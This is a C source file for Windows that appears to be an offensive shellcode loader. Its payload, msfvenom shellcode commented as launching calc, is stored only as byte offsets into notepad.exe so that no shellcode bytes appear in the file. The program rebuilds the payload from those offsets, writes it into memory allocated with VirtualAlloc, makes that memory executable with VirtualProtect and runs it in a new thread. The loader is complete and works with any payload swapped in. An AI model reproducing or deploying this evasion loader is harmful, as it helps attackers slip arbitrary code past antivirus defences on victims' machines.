#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <windows.h>

// ------------------- DO NOT EDIT ABOVE HERE -------------------------------------------- //
// Insert the const unsigned int Position[] generated by the constructor below (as per the example)

//msfvenom calc shellcode with C:\Windows\System32\notepad.exe
const unsigned int Positions[] = {
        266, 1035, 1083, 1140, 276, 488, 264, 3, 3, 3, 1654, 2590, 1654, 256, 224, 2590,
        2278, 1035, 2299, 1369, 99, 1035, 1033, 224, 350, 1035, 1033, 224, 476, 1035, 1033, 224,
        82, 1035, 1033, 84, 256, 1035, 1355, 1582, 581, 581, 1500, 2299, 497, 1035, 2299, 264,
        441, 2000, 88, 3714, 281, 2837, 82, 1654, 351, 497, 117, 1654, 61, 351, 2458, 2347,
        224, 1654, 2590, 1035, 1033, 224, 82, 1033, 799, 2000, 1035, 61, 401, 1033, 337, 568,
        3, 3, 3, 1035, 1426, 264, 96, 86, 1035, 61, 401, 256, 1033, 1035, 476, 108,
        1033, 24, 82, 1068, 61, 401, 5633, 2278, 1035, 12, 497, 1654, 1033, 1661, 568, 1035,
        61, 148, 1500, 2299, 497, 1035, 2299, 264, 441, 1654, 351, 497, 117, 1654, 61, 351,
        1674, 289, 102, 1111, 75, 4, 75, 120, 354, 257, 1438, 3008, 102, 412, 1134, 108,
        1033, 24, 120, 1068, 61, 401, 473, 1654, 1033, 345, 1035, 108, 1033, 24, 1439, 1068,
        61, 401, 1654, 1033, 8, 568, 1035, 61, 401, 1654, 1134, 1654, 1134, 3349, 2243, 1,
        1654, 1134, 1654, 2243, 1654, 1, 1035, 1083, 156, 82, 1654, 224, 12, 289, 1134, 1654,
        2243, 1, 1035, 1033, 657, 2119, 1045, 12, 12, 12, 1477, 1035, 66, 61, 3, 3,
        3, 3, 3, 3, 3, 1035, 1100, 1100, 61, 61, 3, 3, 1654, 66, 2299, 1033,
        85, 3767, 12, 4055, 2561, 289, 2029, 1310, 119, 1654, 66, 5742, 130, 5662, 1999, 12,
        4055, 1035, 1083, 1051, 1570, 2000, 202, 3714, 119, 337, 134, 289, 102, 1044, 2561, 2032,
        129, 84, 85, 10386, 3, 2243, 1654, 1053, 1562, 12, 4055, 91, 88, 763, 91, 3
};

//modify this to the path of the SAME file you used in the constructor
PBYTE bFilePath = "C:\\Windows\\System32\\notepad.exe";


// ------------------- DO NOT EDIT BELOW HERE -------------------------------------------- //


BOOL BytesToBin(IN PBYTE filePath, OUT SIZE_T* sFileSize, OUT PBYTE* bPayloadBuffer) {

    FILE* file = NULL;      //the file we are going to read from
    SIZE_T bytesRead = 0;  //for comparing to fileSize to ensure all bytes are read
    SIZE_T fileSize = NULL;   //size of file being read
    PBYTE PayloadBuffer = NULL;  //buffer to hold the bytes
    int numberOfElements = sizeof(Positions) / sizeof(Positions[0]);

    //open file
    file = fopen(filePath, "rb");
    if (!file) {
        printf("[!] Error opening file. fopen failed with error %d\n", GetLastError());
        return FALSE;
    }

    PayloadBuffer = malloc(numberOfElements * sizeof(byte));

    //iterate through file pulling out each of the bytes from the positions in Positions[] and writing them to PayloadBuffer
    for (int i = 0; i < numberOfElements; i++) {
        fseek(file, Positions[i], SEEK_SET);
        fread(&PayloadBuffer[i], sizeof(byte), 1, file);
        bytesRead++;
    }
    if (bytesRead != numberOfElements) {
        printf("[!] An error occurred reading the bytes: Error %d\n", GetLastError());
        fclose(file);
        return FALSE;
    }

    *bPayloadBuffer = PayloadBuffer;
    *sFileSize = bytesRead;

    //cleanup
    if (file) {
        fclose(file);
    }

    return TRUE;
}

BOOL ClassicInjection(IN SIZE_T sPayloadSize, IN PBYTE pPayloadBuffer, OUT PVOID* pPayloadAddress) {

    //allocate memory
    DWORD oldProtect = NULL;     //needed for virtualalloc

    PVOID pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[!] VirtualAlloc failed with error %d\n", GetLastError());
        return FALSE;
    }

    //copy payload to newly allocated memory and zero out the old payload buffer
    memcpy(pAddress, pPayloadBuffer, sPayloadSize);
    memset(pPayloadBuffer, '\0', sPayloadSize);

    //change memory to be executable
    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] VirtualProtect failed with error %d\n", GetLastError());
        return FALSE;
    }

    *pPayloadAddress = pAddress;

    return TRUE;
}

int main() {

    //for use with the BytesToBin() function
    PBYTE pPayloadBuffer = NULL;
    SIZE_T sPayloadSize = NULL;

    //the memory address where the payload will be written to (returned from the injection functions)
    PVOID pPayloadAddress = NULL;

    //reconstruct the payload
    if (!BytesToBin(bFilePath, &sPayloadSize, &pPayloadBuffer)) {
        return -1;
    }

    //using the classic shellcode injection technique utilising VirtualAlloc and VirtualProtect
    if (!ClassicInjection(sPayloadSize, pPayloadBuffer, &pPayloadAddress)) {
        return -1;
    }

    //execute payload in a new thead
    HANDLE hThread = CreateThread(NULL, NULL, pPayloadAddress, NULL, NULL, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
    }
    else {
        printf("[!] Failed to create thread. CreateThread failed with error %d\n", GetLastError());
        return -1;
    }

    return 0;
}